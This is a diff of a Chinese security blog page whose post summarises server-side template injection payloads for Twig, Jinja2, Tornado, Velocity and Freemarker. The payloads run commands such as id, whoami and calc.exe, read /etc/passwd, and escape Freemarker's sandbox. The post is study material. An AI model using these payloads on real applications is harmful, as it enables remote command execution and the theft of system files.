@@ -22,7 +22,7 @@
     <meta name="description" content="长颈鹿的脖子为什么那么长？">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>Sissel&#39;s blog</title>
+    <title>【安全研究】Hackfest2020 template-injection-workshop · Sissel&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 <meta name="generator" content="Hexo 5.2.0"></head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >Sissel&#39;s blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">【安全研究】Hackfest2020 template-injection-workshop</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>Sissel's blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            【安全研究】Hackfest2020 template-injection-workshop
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "模板注入">模板注入</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">5 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/06/27</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,43 +399,81 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2020/12/02/study-sqli/" >
-            
-                <span>【学习】天枢队内培训-SQL注入部分</span>
-        </a>
-        <div class="abstract-content">
-            <p>为了让队里的师傅掌握基本的SQL语法，学习盲注的方法。<br>在学习web安全之前，建议先去学web开发 XD</p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/12/02</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL">SQL</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "天枢">天枢</a>
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "CTF">CTF</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>跟着这个repo，简单梳理了下常见模板引擎的特征及利用方式。</p>
+<a id="more"></a>
+<p><a target="_blank" rel="noopener" href="https://gosecure.github.io/template-injection-workshop/#0">https://gosecure.github.io/template-injection-workshop/#0</a></p>
+<p><a target="_blank" rel="noopener" href="https://gosecure.github.io/template-injection-workshop/img//a98649c6cdc65546.png"></a></p>
+<p>很少在实际测试中遇到ssti，大部分都是在拿到后台后，修改模板文件，造成后续的命令执行。很多cms可能采用自己的模板引擎（更容易出现漏洞，很多都会用eval偷懒完成各种操作）。</p>
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="Twig-php"><a href="#Twig-php" class="headerlink" title="Twig(php)"></a>Twig(php)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Hello &#123;&#123; var &#125;&#125;</span><br><span class="line">Hello &#123;&#123; var|escape &#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;88-8&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="jinja2-Python-Flask"><a href="#jinja2-Python-Flask" class="headerlink" title="jinja2(Python Flask)"></a>jinja2(Python Flask)</h3><p>这可是老本行了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; message &#125;&#125;</span><br><span class="line">&#123;&#123; foo.bar &#125;&#125;</span><br><span class="line">&#123;&#123; foo[&#39;bar&#39;] &#125;&#125; #两种方法都可以访问属性</span><br><span class="line">&#123;% print(123) %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&quot;&#x2F;etc&#x2F;passwd&quot;,&quot;r&quot;).read()&#125;&#125;</span><br><span class="line"># 主要使用类继承链来拿到沙盒中缺少的方法</span><br><span class="line"></span><br><span class="line">python2里可以拿 site.Printer site.Quitter 找到 os</span><br><span class="line">python3里有 os._wrap_close 直接拿os</span><br><span class="line"></span><br><span class="line">都是在 __init__.__globals__ 找到os模块或模块里的popen组件</span><br></pre></td></tr></table></figure></p>
+<h3 id="Tornado-Python-Tornado"><a href="#Tornado-Python-Tornado" class="headerlink" title="Tornado(Python Tornado)"></a>Tornado(Python Tornado)</h3><p>第一次见应该是2018年的网鼎杯了，更多的是读取<code>secret_key</code>来伪造cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><br>翻阅文档和尝试发现，Tornado的模板引擎中，保留了许多python的builtin函数。所以除了类继承链，他比flask简单很多。甚至还有下面的写法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;%import os%&#125;</span><br><span class="line">&#123;&#123;os.popen(&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h3 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h3><p>具体的调试过程可以参考先知的两篇文章：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8135">https://xz.aliyun.com/t/8135</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7466">https://xz.aliyun.com/t/7466</a></li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($a &#x3D;&quot;velocity&quot;)</span><br><span class="line">#set($b&#x3D;1)</span><br><span class="line">#set($arrayName&#x3D;[&quot;1&quot;,&quot;2&quot;])</span><br><span class="line"></span><br><span class="line">&#39;$var&#39;  ## 结果为：$var</span><br><span class="line">&quot;$var&quot;  ## 结果为：velocity</span><br><span class="line">$a.getClass()</span><br><span class="line"></span><br><span class="line">#set($e&#x3D;&quot;e&quot;)</span><br><span class="line">$e.getClass().forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;touch &#x2F;tmp&#x2F;rai4over&quot;)</span><br></pre></td></tr></table></figure>
+<h3 id="Freemarker"><a href="#Freemarker" class="headerlink" title="Freemarker"></a>Freemarker</h3><p>另一个java常用的模板引擎</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;message&#125;</span><br><span class="line">$&#123;user.displayName&#125;</span><br></pre></td></tr></table></figure>
+<p>该框架中，有built-ins函数的概念<br><a target="_blank" rel="noopener" href="https://freemarker.apache.org/docs/ref_builtins_expert.html">https://freemarker.apache.org/docs/ref_builtins_expert.html</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boolean, byte, eval, new, api</span><br></pre></td></tr></table></figure></p>
+<p>有神奇的调用方式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;nbAverageUsers&#125;</span><br><span class="line">$&#123;nbAverageUsers?abs&#125;</span><br></pre></td></tr></table></figure></p>
+<p>api函数直接获得classloader，但需要<code>api_builtin_enabled=TRUE</code>时才生效，而2.3.22版本之后默认false<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign classLoader&#x3D;object?api.class.protectionDomain.classLoader&gt;</span><br></pre></td></tr></table></figure></p>
+<p>new函数，这样构造payload就比较简单，好在2.3.17版本开始，有这样的限制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Configuration.setNewBuiltinClassResolver(TemplateClassResolver)</span><br><span class="line">or</span><br><span class="line">new_builtin_class_resolver&#x3D;FALSE</span><br></pre></td></tr></table></figure><br>直接的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="一些payload列举"><a href="#一些payload列举" class="headerlink" title="一些payload列举"></a>一些payload列举</h4><p>利用api<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eg1：</span><br><span class="line">&lt;#assign classLoader&#x3D;object?api.class.getClassLoader()&gt;</span><br><span class="line">$&#123;classLoader.loadClass(&quot;our.desired.class&quot;)&#125;</span><br><span class="line"></span><br><span class="line">eg2：</span><br><span class="line">&lt;#assign uri&#x3D;object?api.class.getResource(&quot;&#x2F;&quot;).toURI()&gt;</span><br><span class="line">&lt;#assign input&#x3D;uri?api.create(&quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;).toURL().openConnection()&gt;</span><br><span class="line">&lt;#assign is&#x3D;input?api.getInputStream()&gt;</span><br><span class="line">FILE:[&lt;#list 0..999999999 as _&gt;</span><br><span class="line">    &lt;#assign byte&#x3D;is.read()&gt;</span><br><span class="line">    &lt;#if byte &#x3D;&#x3D; -1&gt;</span><br><span class="line">        &lt;#break&gt;</span><br><span class="line">    &lt;&#x2F;#if&gt;</span><br><span class="line">$&#123;byte&#125;, &lt;&#x2F;#list&gt;]</span><br></pre></td></tr></table></figure></p>
+<p>利用new<br>主要是寻找实现了 <code>TemplateModel</code> 接口的可利用类来进行实例化。<code>freemarker.template.utility</code>包中存在三个符合条件的类，分别为<code>Execute</code>类、<code>ObjectConstructor</code>类、<code>JythonRuntime</code>类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;calc.exe&quot;)&#125;</span><br><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;$&#123;value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc.exe&quot;).start()&#125;</span><br><span class="line">&lt;#assign value&#x3D;&quot;freemarker.template.utility.JythonRuntime&quot;?new()&gt;&lt;@value&gt;import os;os.system(&quot;calc.exe&quot;)&lt;&#x2F;@value&gt; &#x2F;&#x2F;@value为自定义标签</span><br></pre></td></tr></table></figure></p>
+<h3 id="Freemaker逃逸沙盒"><a href="#Freemaker逃逸沙盒" class="headerlink" title="Freemaker逃逸沙盒"></a>Freemaker逃逸沙盒</h3><p>高版本中加入了黑白名单，限制了可以获取到的class。</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/1304/">https://paper.seebug.org/1304/</a></li>
+</ul>
+<p>爆破可以使用的classLoader函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;#list .data_model as key, object_test&gt;</span><br><span class="line"></span><br><span class="line">&lt;b&gt;Testing &quot;$&#123;key&#125;&quot;:&lt;&#x2F;b&gt;&lt;br&#x2F;&gt;</span><br><span class="line">&lt;#attempt&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign classloader&#x3D;object_test.class.protectionDomain.classLoader&gt;</span><br><span class="line">&lt;#assign owc&#x3D;classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line">&lt;#assign dwf&#x3D;owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line">&lt;#assign ec&#x3D;classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line"></span><br><span class="line">Shell ! ( </span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;id&quot;)&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&lt;#recover&gt;</span><br><span class="line">failed</span><br><span class="line">&lt;&#x2F;#attempt&gt;</span><br><span class="line"></span><br><span class="line">&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;#list&gt;</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>ssti并非很复杂的漏洞，其中php和Python的模板引擎都较好理解与调试。Java的 Freemaker 模板引擎加入了class的黑白名单，在学一段时间的Java之后考虑回来调一调这个洞。</p>
+
     </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://sisselcbp.github.com">Sissel</a>
+            <p>原文链接：<a href="https://sisselcbp.github.com/2020/06/27/study-ssti/">https://sisselcbp.github.com/2020/06/27/study-ssti/</a>
+            <p>发表日期：<a href="https://sisselcbp.github.com/2020/06/27/study-ssti/">June 27th 2020, 2:51:00 pm</a>
+            <p>更新日期：<a href="https://sisselcbp.github.com/2020/06/27/study-ssti/">January 8th 2021, 11:16:38 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/10/05/study-hashcat_aircrack_wifi_wpa/" title= "【学习】hashcat爆破、wifi握手包工具总结">
+                    <div class="nextTitle">【学习】hashcat爆破、wifi握手包工具总结</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/03/20/wp-202002zhanyi-OwnerMoney/" title= "【区块链】赛宁新春战役CTF-区块链-OwnerMoney">
+                    <div class="prevTitle">【区块链】赛宁新春战役CTF-区块链-OwnerMoney</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -464,6 +563,24 @@
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-number">1.</span> <span class="toc-text">php</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Twig-php"><span class="toc-number">1.1.</span> <span class="toc-text">Twig(php)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python"><span class="toc-number">2.</span> <span class="toc-text">Python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jinja2-Python-Flask"><span class="toc-number">2.1.</span> <span class="toc-text">jinja2(Python Flask)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tornado-Python-Tornado"><span class="toc-number">2.2.</span> <span class="toc-text">Tornado(Python Tornado)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Java"><span class="toc-number">3.</span> <span class="toc-text">Java</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Velocity"><span class="toc-number">3.1.</span> <span class="toc-text">Velocity</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Freemarker"><span class="toc-number">3.2.</span> <span class="toc-text">Freemarker</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9Bpayload%E5%88%97%E4%B8%BE"><span class="toc-number">3.2.1.</span> <span class="toc-text">一些payload列举</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Freemaker%E9%80%83%E9%80%B8%E6%B2%99%E7%9B%92"><span class="toc-number">3.3.</span> <span class="toc-text">Freemaker逃逸沙盒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -901,6 +1018,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
